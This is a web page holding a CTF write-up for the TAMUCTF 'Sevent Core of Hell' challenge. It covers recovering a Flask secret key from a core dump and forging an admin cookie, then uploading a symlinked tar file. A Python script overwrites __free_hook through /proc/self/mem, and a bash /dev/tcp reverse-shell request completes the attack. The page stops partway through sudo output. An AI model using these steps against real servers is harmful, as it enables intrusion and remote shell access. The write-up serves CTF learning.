@@ -1,0 +1,449 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>TAMUCTF 2021 - Sevent Core of Hell | circleous</title><link rel=stylesheet href=/css/main.min.a16339a5d57f8df4724d41efd02e48d0023feb1e3934721f39cbdc1bb1a12b31.css integrity="sha256-oWM5pdV/jfRyTUHv0C5I0AI/6x45NHIfOcvcG7GhKzE=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>TAMUCTF 2021 - Sevent Core of Hell</h1><time datetime=2020-04-26T00:00:00+07:00>April 26, 2020</time></header><p>We are given a source of a flask application and the content is in this <a href=https://gist.github.com/circleous/007f4a30cb4a8472fdf893c63582404c>gist</a>, if you don&rsquo;t want to read the code, here is a TL;DR version of the flask app capabilities:</p><ol><li>app.secret_key is initialized with random.choice(digits+ascii_letters)</li><li>To login as admin, the password is also checked with random.choice(digits+ascii_letters) repeated 256 times</li><li>As an admin, we can do much more stuff like upload a file, upload a tar file, and browse or read files. The pathname is strictly checked from any LFI attempt, so we can&rsquo;t do any LFI.</li><li>We have /dump/ route which will make a core dump of the current flask app and let us download it.</li></ol><h3 id=first-stage---bake-the-cookie>First Stage - Bake the Cookie</h3><p>The first stage is clear, now we have to elevate our user as an admin, but since the password is checked with random.choice every time, we have to find another way. We have a /dump/ route which will make a core dump of the current running flask app. A core dump is a memory snapshot of the app, so maybe we can search for app.secret_key and use it to forge a cookie. But how do we find a 256 bytes string on a huge ~90MB-ish file? Now comes the first pain. In python, you can use id() to get the object address. For example</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>&gt;&gt;&gt;</span> a <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;&#39;</span><span style=color:#9ece6a;font-weight:700>.</span>join([<span style=color:#9ece6a>&#34;c&#34;</span> <span style=color:#bb9af7>for</span> _ <span style=color:#9ece6a;font-weight:700>in</span> <span style=color:#9ece6a>range</span>(<span style=color:#e0af68>256</span>)])
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>&gt;&gt;&gt;</span> <span style=color:#9ece6a>id</span>(a)
+</span></span><span style=display:flex><span><span style=color:#e0af68>140461683019248</span>
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>...</span>
+</span></span><span style=display:flex><span>(gdb) x<span style=color:#9ece6a;font-weight:700>/</span><span style=color:#e0af68>30</span>gx <span style=color:#e0af68>140461683019248</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88df0</span>: <span style=color:#e0af68>0x0000000000000000</span>      <span style=color:#e0af68>0x00007fbfc934f920</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e00</span>: <span style=color:#e0af68>0x0000000000000100</span>      <span style=color:#e0af68>0xffffffffffffffff</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e10</span>: <span style=color:#e0af68>0x00007fbfc8b5dde4</span>      <span style=color:#e0af68>0x0000000000000000</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e20</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e30</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e40</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e50</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e60</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e70</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e80</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88e90</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88ea0</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88eb0</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88ec0</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span><span style=display:flex><span><span style=color:#e0af68>0x7fbfc8b88ed0</span>: <span style=color:#e0af68>0x6363636363636363</span>      <span style=color:#e0af68>0x6363636363636363</span>
+</span></span></code></pre></div><p>If you play around with it a little bit more, you&rsquo;ll notice that one thing that&rsquo;s not changing is at offset 16 and it&rsquo;s the length of the string and followed by 0xffff&mldr; We can use this to our advantage as a pivot to get the secret key from the core dump. I used radare2 to find the bytes because r2 has an easier API to search for things. We can use <code>/x 0001000000000000ffffffffffffffff</code> to search our pivot and use <code>px @@ hit0_*</code> to iterate the found offset</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>[</span>0x7f0324527819<span style=color:#9ece6a;font-weight:700>]</span>&gt; /x 0001000000000000ffffffffffffffff
+</span></span><span style=display:flex><span>    ...
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>[</span>0x7f0324527819<span style=color:#9ece6a;font-weight:700>]</span>&gt; px @ hit0_*
+</span></span><span style=display:flex><span>    Do you want to print <span style=color:#e0af68>459</span> lines? <span style=color:#9ece6a;font-weight:700>(</span>y/N<span style=color:#9ece6a;font-weight:700>)</span>
+</span></span><span style=display:flex><span>    - offset -       <span style=color:#e0af68>0</span> <span style=color:#e0af68>1</span>  <span style=color:#e0af68>2</span> <span style=color:#e0af68>3</span>  <span style=color:#e0af68>4</span> <span style=color:#e0af68>5</span>  <span style=color:#e0af68>6</span> <span style=color:#e0af68>7</span>  <span style=color:#e0af68>8</span> <span style=color:#e0af68>9</span>  A B  C D  E F  0123456789ABCDEF
+</span></span><span style=display:flex><span>    0x5644740ac160  <span style=color:#e0af68>0001</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> ffff ffff ffff ffff  ................
+</span></span><span style=display:flex><span>    0x5644740ac170  a800 <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span>  ................
+</span></span><span style=display:flex><span>    0x5644740ac180  <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span>  ................
+</span></span><span style=display:flex><span>    0x5644740ac190  <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0100</span> <span style=color:#e0af68>0200</span> <span style=color:#e0af68>0300</span>  ................
+</span></span><span style=display:flex><span>    0x5644740ac1a0  <span style=color:#e0af68>0400</span> <span style=color:#e0af68>0500</span> <span style=color:#e0af68>0600</span> <span style=color:#e0af68>0700</span> <span style=color:#e0af68>0800</span> <span style=color:#e0af68>0900</span> 0a00 0b00  ................
+</span></span><span style=display:flex><span>    0x5644740ac1b0  0c00 0d00 0e00 0f00 <span style=color:#e0af68>1000</span> <span style=color:#e0af68>1100</span> <span style=color:#e0af68>1200</span> <span style=color:#e0af68>1300</span>  ................
+</span></span><span style=display:flex><span>    0x5644740ac1c0  <span style=color:#e0af68>1400</span> <span style=color:#e0af68>1500</span> <span style=color:#e0af68>1600</span> <span style=color:#e0af68>1700</span> <span style=color:#e0af68>1800</span> <span style=color:#e0af68>1900</span> 1a00 1b00  ................
+</span></span><span style=display:flex><span>    0x5644740ac1d0  1c00 1d00 1e00 1f00 <span style=color:#e0af68>2000</span> <span style=color:#e0af68>2100</span> <span style=color:#e0af68>2200</span> <span style=color:#e0af68>2300</span>  ........ .!.<span style=color:#9ece6a>&#34;.#.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac1e0  2400 2500 2600 2700 2800 2900 2a00 2b00  </span>$<span style=color:#9ece6a>.%.&amp;.&#39;.(.).*.+.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac1f0  2c00 2d00 2e00 2f00 3000 3100 3200 3300  ,.-.../.0.1.2.3.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac200  3400 3500 3600 3700 3800 3900 3a00 3b00  4.5.6.7.8.9.:.;.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac210  3c00 3d00 3e00 3f00 4000 4100 4200 4300  &lt;.=.&gt;[email protected].
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac220  4400 4500 4600 4700 4800 4900 4a00 4b00  D.E.F.G.H.I.J.K.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac230  4c00 4d00 4e00 4f00 5000 5100 5200 5300  L.M.N.O.P.Q.R.S.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac240  5400 5500 5600 5700 5800 5900 5a00 5b00  T.U.V.W.X.Y.Z.[.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x5644740ac250  5c00 5d00 5e00 5f00 6000 6100 6200 6300  \.].^._.`.a.b.c.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab760  0001 0000 0000 0000 ffff ffff ffff ffff  ................
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab770  4d36 5864 5746 6e6f 304a 4238 7a69 7335  M6XdWFno0JB8zis5
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab780  5633 466a 704d 7447 6876 6853 5a4d 4b4b  V3FjpMtGhvhSZMKK
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab790  4166 6d6d 596c 6a62 5141 4b35 7433 7879  AfmmYljbQAK5t3xy
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab7a0  4a48 4f30 446d 6946 5866 4a5a 3556 4f57  JHO0DmiFXfJZ5VOW
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab7b0  7561 6842 4258 737a 5750 3375 355a 6c4a  uahBBXszWP3u5ZlJ
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab7c0  4438 5865 5179 5054 5435 4358 5130 5569  D8XeQyPTT5CXQ0Ui
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab7d0  6c32 7530 3967 6462 424c 4f30 5471 7256  l2u09gdbBLO0TqrV
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab7e0  6b52 4252 4967 655a 7747 6651 4764 5175  kRBRIgeZwGfQGdQu
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab7f0  724f 6e6c 496d 5830 6933 4276 3148 5067  rOnlImX0i3Bv1HPg
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab800  4a39 746b 7278 3372 4449 626f 3569 776e  J9tkrx3rDIbo5iwn
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab810  346e 5773 664d 3879 796c 356c 784e 356b  4nWsfM8yyl5lxN5k
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab820  3772 5335 7362 3458 5a79 457a 6244 7266  7rS5sb4XZyEzbDrf
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab830  306e 6748 7136 6842 7370 7439 594f 6b69  0ngHq6hBspt9YOki
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab840  3768 3168 424d 3769 476a 564b 7052 5543  7h1hBM7iGjVKpRUC
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab850  4655 744d 6a42 364e 3966 5651 5442 4e6b  FUtMjB6N9fVQTBNk
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab9c0  0001 0000 0000 0000 ffff ffff ffff ffff  ................
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab9d0  6400 6401 6c00 6d01 5a01 6d02 5a02 0100  d.d.l.m.Z.m.Z...
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab9e0  6400 6402 6c03 6d04 5a04 6d05 5a05 6d06  d.d.l.m.Z.m.Z.m.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225ab9f0  5a06 6d07 5a07 6d08 5a08 6d09 5a09 6d0a  Z.m.Z.m.Z.m.Z.m.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    0x7f03225aba00  5a0a 6d0b 5a0b 6d0c 5a0c 6d0d 5a0d 6d0e  Z.m.Z.m.Z.m.Z.m.
+</span></span></span><span style=display:flex><span><span style=color:#9ece6a>    ...
+</span></span></span></code></pre></div><p>Take a look at <strong>0x7f03225ab760</strong>, the charset used is exactly ascii_letters + digits. We can safely guess that this is the app.secret_key that we are trying to find. To test that we need to forge a cookie with that secret_key. There are several ways for doing this, but I choose to set the app.secret_key with the one we have found and add an /admin/ route that will automatically set the session, the code is here,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#7aa2f7;font-weight:700>@app.route</span>(<span style=color:#9ece6a>&#39;/admin/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>admin</span>():
+</span></span><span style=display:flex><span>    session[<span style=color:#9ece6a>&#34;admin&#34;</span>] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>True</span>
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>&#34;&#34;</span>
+</span></span></code></pre></div><p>Just run this locally, go to /admin/, copy the session cookie and test it on the remote server by accessing /browse/.</p><h3 id=second-stage---symlink-to-the-rescue>Second Stage - Symlink to The Rescue</h3><p>Now we have admin privileges, but we still can&rsquo;t do anything because the accessible folder is tied down to ./files/. Fret not! As an admin, we can upload a .tar file and the server will extract it. Tar has this feature where you can add a symlink in the archive and still keep the symlink even after extracting it. This is perfect because we can make a symlink to / root dir, that way we can browse to / dir and get some kind of LFI. Here is the step create the malicious tar file,</p><pre tabindex=0><code>$ mkdir test
+$ ln -sf / test/root
+$ tar -cvf exp.tar test
+</code></pre><p>Upload exp.tar with batch upload and browse to /test/root/, now we have the ability to browse from the root directory. One thing you might have noticed after this, <strong>there&rsquo;s no flag.txt on / directory</strong>. So, where&rsquo;s the flag?</p><p>This is where you need to do another recon on what&rsquo;s happening on the server machine. Browsing through <strong>/proc/[pid]/cmdline</strong> to get a list of the running process, you&rsquo;ll notice there&rsquo;s an <strong>ssh-agent</strong> running. There&rsquo;s also another user named <strong>alice</strong> in /home/ directory, inside of it there&rsquo;s a private and public ssh key but we can read it because of the permission. So, how do we get the ssh key?</p><p>If you read the code, /dump/ is actually executing <strong>sudo gcore [os.getpid()]</strong>. Does this means we have sudo privilege? or does this means we only have privileges to execute gcore with sudo without password? Well, only one way to find out and that&rsquo;s to get RCE.</p><p>There&rsquo;re several ways to get RCE, but here&rsquo;s one of the easiest. <strong>Overwrite __free_hook with system()</strong>, we may have a huge memory leak after this that make it really unstable, but hey, a <em>shell</em> is a <em>shell</em> right? We can <strong>read /proc/self/maps</strong> to get the base address leak and <strong>upload_single with offset set to __free_hook</strong> and the content of the file should be the address to system, here&rsquo;s the script to do that</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#7dcfff>import</span> <span style=color:#e0af68>requests</span>
+</span></span><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>io</span> <span style=color:#7dcfff>import</span> BytesIO
+</span></span><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>pwn</span> <span style=color:#7dcfff>import</span> <span style=color:#9ece6a;font-weight:700>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>read_file</span>(path, off<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>0</span>, size<span style=color:#9ece6a;font-weight:700>=-</span><span style=color:#e0af68>1</span>):
+</span></span><span style=display:flex><span>    res <span style=color:#9ece6a;font-weight:700>=</span> requests<span style=color:#9ece6a;font-weight:700>.</span>get(
+</span></span><span style=display:flex><span>        <span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;</span><span style=color:#9ece6a>{</span>URL<span style=color:#9ece6a>}</span><span style=color:#9ece6a>/get_file/&#34;</span>,
+</span></span><span style=display:flex><span>        cookies<span style=color:#9ece6a;font-weight:700>=</span>cookies,
+</span></span><span style=display:flex><span>        params<span style=color:#9ece6a;font-weight:700>=</span>{
+</span></span><span style=display:flex><span>            <span style=color:#9ece6a>&#34;file&#34;</span>: <span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;test/root</span><span style=color:#9ece6a>{</span>path<span style=color:#9ece6a>}</span><span style=color:#9ece6a>&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#9ece6a>&#34;offset&#34;</span>: off,
+</span></span><span style=display:flex><span>            <span style=color:#9ece6a>&#34;size&#34;</span>: size
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> res<span style=color:#9ece6a;font-weight:700>.</span>content
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>upload_file</span>(content, path, filename, offset<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>0</span>):
+</span></span><span style=display:flex><span>    res <span style=color:#9ece6a;font-weight:700>=</span> requests<span style=color:#9ece6a;font-weight:700>.</span>post(
+</span></span><span style=display:flex><span>        <span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;</span><span style=color:#9ece6a>{</span>URL<span style=color:#9ece6a>}</span><span style=color:#9ece6a>/upload_single/&#34;</span>,
+</span></span><span style=display:flex><span>        cookies<span style=color:#9ece6a;font-weight:700>=</span>cookies,
+</span></span><span style=display:flex><span>        data<span style=color:#9ece6a;font-weight:700>=</span>{
+</span></span><span style=display:flex><span>            <span style=color:#9ece6a>&#34;current_path&#34;</span>: <span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;test/root</span><span style=color:#9ece6a>{</span>path<span style=color:#9ece6a>}</span><span style=color:#9ece6a>&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#9ece6a>&#34;offset&#34;</span>: offset,
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        files<span style=color:#9ece6a;font-weight:700>=</span>{ <span style=color:#9ece6a>&#34;data&#34;</span>: (filename, BytesIO(content)) }
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a>print</span>(res<span style=color:#9ece6a;font-weight:700>.</span>content)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pie <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>
+</span></span><span style=display:flex><span>heap <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>
+</span></span><span style=display:flex><span>libc_base <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>parse_maps</span>(maps):
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>global</span> libc_base, pie, heap
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> line <span style=color:#9ece6a;font-weight:700>in</span> maps<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9ece6a>&#34;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>):
+</span></span><span style=display:flex><span>        line <span style=color:#9ece6a;font-weight:700>=</span> line<span style=color:#9ece6a;font-weight:700>.</span>strip()
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>if</span> line <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9ece6a>&#34;&#34;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#bb9af7>continue</span>
+</span></span><span style=display:flex><span>        tok <span style=color:#9ece6a;font-weight:700>=</span> line<span style=color:#9ece6a;font-weight:700>.</span>split()
+</span></span><span style=display:flex><span>        l, r <span style=color:#9ece6a;font-weight:700>=</span> tok[<span style=color:#e0af68>0</span>]<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9ece6a>&#34;-&#34;</span>)
+</span></span><span style=display:flex><span>        l <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(l, <span style=color:#e0af68>16</span>)
+</span></span><span style=display:flex><span>        r <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(r, <span style=color:#e0af68>16</span>)
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>not</span> libc_base) <span style=color:#9ece6a;font-weight:700>and</span> <span style=color:#9ece6a>&#34;libc-2.28.so&#34;</span> <span style=color:#9ece6a;font-weight:700>in</span> line:
+</span></span><span style=display:flex><span>            libc_base <span style=color:#9ece6a;font-weight:700>=</span> l
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>elif</span> (<span style=color:#9ece6a;font-weight:700>not</span> heap) <span style=color:#9ece6a;font-weight:700>and</span> <span style=color:#9ece6a>&#34;heap&#34;</span> <span style=color:#9ece6a;font-weight:700>in</span> line:
+</span></span><span style=display:flex><span>            heap <span style=color:#9ece6a;font-weight:700>=</span> l
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>elif</span> (<span style=color:#9ece6a;font-weight:700>not</span> pie) <span style=color:#9ece6a;font-weight:700>and</span> <span style=color:#9ece6a>&#34;/usr/local/bin/python3.9&#34;</span> <span style=color:#9ece6a;font-weight:700>in</span> line:
+</span></span><span style=display:flex><span>            pie <span style=color:#9ece6a;font-weight:700>=</span> l
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> args<span style=color:#9ece6a;font-weight:700>.</span>PATCH:
+</span></span><span style=display:flex><span>    maps <span style=color:#9ece6a;font-weight:700>=</span> read_file(<span style=color:#9ece6a>&#34;/proc/self/maps&#34;</span>)<span style=color:#9ece6a;font-weight:700>.</span>decode()
+</span></span><span style=display:flex><span>    parse_maps(maps)
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a>print</span>(<span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;[+] pie 0x</span><span style=color:#9ece6a>{</span>pie<span style=color:#9ece6a>:</span><span style=color:#9ece6a>x</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a>&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a>print</span>(<span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;[+] libc 0x</span><span style=color:#9ece6a>{</span>libc_base<span style=color:#9ece6a>:</span><span style=color:#9ece6a>x</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a>&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a>print</span>(<span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;[+] heap 0x</span><span style=color:#9ece6a>{</span>heap<span style=color:#9ece6a>:</span><span style=color:#9ece6a>x</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    libc <span style=color:#9ece6a;font-weight:700>=</span> ELF(<span style=color:#9ece6a>&#34;./libc.so.6&#34;</span>,<span style=color:#e0af68>0</span>)
+</span></span><span style=display:flex><span>    libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>=</span> libc_base
+</span></span><span style=display:flex><span>    upload_file(content<span style=color:#9ece6a;font-weight:700>=</span>p64(libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#34;system&#34;</span>]), path<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;/proc/self/&#34;</span>,
+</span></span><span style=display:flex><span>            filename<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;mem&#34;</span>, offset<span style=color:#9ece6a;font-weight:700>=</span>libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#34;__free_hook&#34;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Since we have <span style=color:#9ece6a>set</span> \_\_free_hook to system, this basically means that everything that we send to the flask app will get executed<span style=color:#9ece6a;font-weight:700>.</span> This <span style=color:#9ece6a;font-weight:700>is</span> because <span style=color:#bb9af7>if</span> we make an HTTP request, somewhere <span style=color:#9ece6a;font-weight:700>in</span> the code it<span style=color:#9ece6a>&#39;ll try to destruct the HTTP request buffer and that way we get an RCE. To trigger the RCE and get a rev shell, here&#39;</span>s the HTTP request that I have used,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    POST <span style=color:#9ece6a;font-weight:700>/</span>problem<span style=color:#9ece6a;font-weight:700>/</span><span style=color:#db4b4b>$</span>{PORT}<span style=color:#9ece6a;font-weight:700>/</span>add_note HTTP<span style=color:#9ece6a;font-weight:700>/</span><span style=color:#e0af68>1.1</span>
+</span></span><span style=display:flex><span>    Host: shell<span style=color:#9ece6a;font-weight:700>.</span>tamuctf<span style=color:#9ece6a;font-weight:700>.</span>com
+</span></span><span style=display:flex><span>    Connection: close
+</span></span><span style=display:flex><span>    User<span style=color:#9ece6a;font-weight:700>-</span>Agent: dumb
+</span></span><span style=display:flex><span>    Cookie: session<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#db4b4b>$</span>{TOKEN};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>/</span><span style=color:#9ece6a>bin</span><span style=color:#9ece6a;font-weight:700>/</span>bash <span style=color:#9ece6a;font-weight:700>-</span>c <span style=color:#9ece6a>&#34;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/$</span><span style=color:#9ece6a>{LHOST}</span><span style=color:#9ece6a>/$</span><span style=color:#9ece6a>{LPORT}</span><span style=color:#9ece6a>; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#34;</span>
+</span></span></code></pre></div><h3 id=third-stage---steal-the-key>Third Stage - Steal the Key</h3><p>Now we have RCE, thus we can have a better view of what&rsquo;s happening inside. Running <strong>sudo -l</strong> indeed gave us something. We are <strong>only allowed to use gcore with sudo without a password</strong>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#bb9af7>for</span> vault on 37565c96ce52:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass,
+</span></span><span style=display:flex><span>    secure_path<span style=color:#9ece6a;font-weight:700>=</span>/usr/local/sbin<span style=color:#7aa2f7>\:</span>/usr/local/bin<span style=color:#7aa2f7>\:</span>/usr/sbin<span style=color:#7aa2f7>\:</span>/usr/bin<span style=color:#7aa2f7>\:</span>/sbin<span style=color:#7aa2f7>\:</span>/bin
+</span></span><span style=display:flex><span>
